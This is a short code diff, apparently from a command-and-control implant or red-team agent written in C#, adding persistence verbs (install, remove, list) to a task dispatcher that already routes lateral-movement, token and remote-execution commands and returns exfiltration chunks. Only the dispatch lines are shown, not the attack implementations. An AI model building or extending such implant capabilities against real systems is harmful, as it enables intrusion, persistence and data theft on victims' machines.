@@ -91,6 +91,9 @@ internal sealed class Runner
             "lateral.move" => WithNoChunks(Lateral.Move(arguments, _enroll)),
             "lateral.token" => WithNoChunks(Lateral.Token(arguments)),
             "lateral.exec_remote" => WithNoChunks(Lateral.ExecRemote(arguments)),
+            "persist.install" => WithNoChunks(Persist.Install(arguments)),
+            "persist.remove" => WithNoChunks(Persist.Remove(arguments)),
+            "persist.list" => WithNoChunks(Persist.List(arguments)),
             _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
         };
     }
